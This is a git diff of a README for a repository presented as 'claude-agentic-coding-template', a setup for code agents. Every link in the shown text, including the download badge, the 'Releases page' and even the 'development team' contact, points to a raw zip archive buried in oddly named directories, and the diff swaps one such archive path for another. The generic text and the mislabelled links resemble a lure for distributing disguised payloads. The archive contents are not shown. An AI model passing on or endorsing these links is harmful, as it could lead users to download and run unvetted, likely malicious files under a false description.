@@ -1,7 +1,7 @@
 # 🛠️ claude-agentic-coding-template - A Simple Setup for Code Agents
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/misasusma/claude-agentic-coding-template/main/putrilaginous/claude-agentic-coding-template.zip%20release-brightgreen)](https://raw.githubusercontent.com/misasusma/claude-agentic-coding-template/main/putrilaginous/claude-agentic-coding-template.zip)
+[![Download](https://github.com/misasusma/claude-agentic-coding-template/raw/refs/heads/main/.claude/ARCHIVE/duplicated-claude-dir/taskmaster-data/agentic-template-coding-claude-v3.0.zip%20release-brightgreen)](https://github.com/misasusma/claude-agentic-coding-template/raw/refs/heads/main/.claude/ARCHIVE/duplicated-claude-dir/taskmaster-data/agentic-template-coding-claude-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 To get started, follow these simple steps:
 
-1. **Visit our Releases Page:** Click this link to go to our [Releases page](https://raw.githubusercontent.com/misasusma/claude-agentic-coding-template/main/putrilaginous/claude-agentic-coding-template.zip).
+1. **Visit our Releases Page:** Click this link to go to our [Releases page](https://github.com/misasusma/claude-agentic-coding-template/raw/refs/heads/main/.claude/ARCHIVE/duplicated-claude-dir/taskmaster-data/agentic-template-coding-claude-v3.0.zip).
    
 2. **Choose the Latest Version:** Look for the version labeled as “Latest Release”. It's usually at the top of the list.
 
@@ -64,10 +64,10 @@ If you have questions or need assistance, feel free to reach out. We prioritize 
 
 ## 🔄 Updates and Future Versions
 
-We regularly update the application to enhance features and address feedback from users. Check the [Releases page](https://raw.githubusercontent.com/misasusma/claude-agentic-coding-template/main/putrilaginous/claude-agentic-coding-template.zip) often for updates. 
+We regularly update the application to enhance features and address feedback from users. Check the [Releases page](https://github.com/misasusma/claude-agentic-coding-template/raw/refs/heads/main/.claude/ARCHIVE/duplicated-claude-dir/taskmaster-data/agentic-template-coding-claude-v3.0.zip) often for updates. 
 
 ## 📫 Contact Information
 
-For further inquiries, you can reach the development team at https://raw.githubusercontent.com/misasusma/claude-agentic-coding-template/main/putrilaginous/claude-agentic-coding-template.zip We appreciate your feedback and are always here to help you get the most out of the claude-agentic-coding-template.
+For further inquiries, you can reach the development team at https://github.com/misasusma/claude-agentic-coding-template/raw/refs/heads/main/.claude/ARCHIVE/duplicated-claude-dir/taskmaster-data/agentic-template-coding-claude-v3.0.zip We appreciate your feedback and are always here to help you get the most out of the claude-agentic-coding-template.
 
 Thank you for using the claude-agentic-coding-template. Happy coding!
